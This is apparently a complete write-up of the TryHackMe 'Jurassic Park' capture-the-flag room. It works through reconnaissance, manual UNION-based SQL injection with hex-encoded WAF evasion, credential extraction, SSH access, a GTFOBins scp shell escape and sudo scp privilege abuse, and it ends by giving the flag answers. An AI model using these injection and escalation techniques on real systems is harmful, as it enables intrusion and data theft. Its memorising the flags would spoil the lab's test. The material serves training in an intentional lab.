### TryHackMe **Jurassic Park Write-up**

**Introduction** Since there aren’t many resources or write-ups for this specific CTF on TryHackMe, here is a complete walkthrough.

### Phase 1: Reconnaissance

We start with a classic Nmap scan to see what ports are open on the target.

nmap -sV -sC $TARGET_IP

**Open Ports (Nothing crazy) :**

- Port 22 (SSH)
- Port 80 (HTTP)

### Phase 2: Web Exploitation (SQL Injection)

Navigating to the website on Port 80, we browse around until we find a potential SQL injection vulnerability on the `item.php` page.

Testing with a simple `'` quote (also some words like “password”, “username”, @, etc) (`item.php?id='`) triggers a Jurassic Park-themed error page:

> _access: PERMISSION DENIED…and… YOU DIDN’T SAY THE MAGIC WORD! […] Try SqlMap.. I dare you.._

Taking the bait, we run an aggressive SQLMap scan:

sqlmap -u 'http://$TARGET_IP/item.php?id=1' --level=3 --risk=3 --dbms=mysql --random-agent --time-sec=10 --batch  
sqlmap -u 'http://$TARGET_IP/item.php?id=1' --dbs

But the WAF got too much restrictions, doing it manually via UNION-based injection proves to be much more effective.

**1. First, finding the number of columns:**

http://$TARGET_IP/item.php?id=1 order by 5  --> (Normal page loads)  
http://$TARGET_IP/item.php?id=1 order by 6  --> (Error)

- **How many columns does the table have?** 5

**2. Extracting the system version:**

http://$TARGET_IP/item.php?id=67 UNION SELECT 1, 2, 3, 4, version()

- **What is the system version?** Ubuntu 16.04

**3. Extracting tables and bypassing the WAF:** First, we list the tables in the current database:

http://$TARGET_IP/item.php?id=67 UNION SELECT 1, 2, 3, group_concat(table_name), version() FROM information_schema.tables WHERE table_schema = database()

_Result:_ `items`, `users`

Next, we look for the columns inside the `users` table

http://$TARGET_IP/item.php?id=67 UNION SELECT 1, 2, 3, GROUP_CONCAT(column_name), version() FROM information_schema.columns WHERE table_name = users

(If it doesn’t work you can convert the string “users” to hex (`0x7573657273`) to bypass WAF filters).

http://$TARGET_IP/item.php?id=67 UNION SELECT 1, 2, 3, GROUP_CONCAT(column_name), version() FROM information_schema.columns WHERE table_name = 0x7573657273

_Result:_ `id, username, password, USER, CURRENT_CONNECTIONS, TOTAL_CONNECTIONS`

**The Trap:** Notice there are 6 columns returned, but we know the site table only has 3 columns (`id`, `username`, `password`). The database is querying both our target `users` table and a system `users` table.

To avoid the “used SELECT statements have a different number of columns” error, we specify exactly 3 columns for our virtual table:

67 UNION SELECT 1, GROUP_CONCAT(`2`), 3, GROUP_CONCAT(`3`), 5 FROM (SELECT 1,2,3 UNION SELECT * FROM users)a

Usernames : harry, dennis

Password : D0nt3ATM3, ih8dinos

- **What is Dennis’ password?** `ih8dinos`

### Phase 3: Initial Access & The First Flags

With Dennis’ credentials, we try to connect via SSH.

ssh dennis@$TARGET_IP

**Flag 1** Right away in the home directory, we find our first flag.

cat flag1.txt

- **What are the contents of the first flag?** `b89f2d69c56b9981ac92dd267f`

**Flag 3** Then, we check classic CTF hiding spot like bash history. BINGO !

cat /home/dennis/.bash_history

- **What are the contents of the third flag?** `b4973bbc9053807856ec815db25fb3f1`

### Phase 4: Escaping the Shell & Finding Flag 2

Running `sudo -l` reveals our privilege escalation vector:

> `_(ALL) NOPASSWD: /usr/bin/scp_`

To break out of the potentially restricted shell and get a clean environment to search the entire file system, we use a GTFOBins trick with `scp`:

scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:

Now that we have a clean shell, we can search the entire system for the flags :

find / -name "*flag*" -type f 2>/dev/null

The output reveals a very sneaky location: `/boot/grub/fonts/flagTwo.txt`.

cat /boot/grub/fonts/flagTwo.txt

- **What are the contents of the second flag?** `96ccd6b429be8c9a4b501c7a0b117b0a`

_(Note: Flag 4 is missing/removed from the CTF)._

### Phase 5: Privilege Escalation (Flag 5)

We know from a script (`test.sh`) left in the home directory that `flag5.txt` is located in `/root/`. Since we can run `scp` as root without a password, we don't need complex exploits or C scripts. We can simply copy the flag from the restricted `/root` directory to the public `/tmp` directory.

sudo scp /root/flag5.txt /tmp/flag5.txt  
cat /tmp/flag5.txt

- **What are the contents of the fifth flag?** `2a7074e491fcacc7eeba97808dc5e2ec`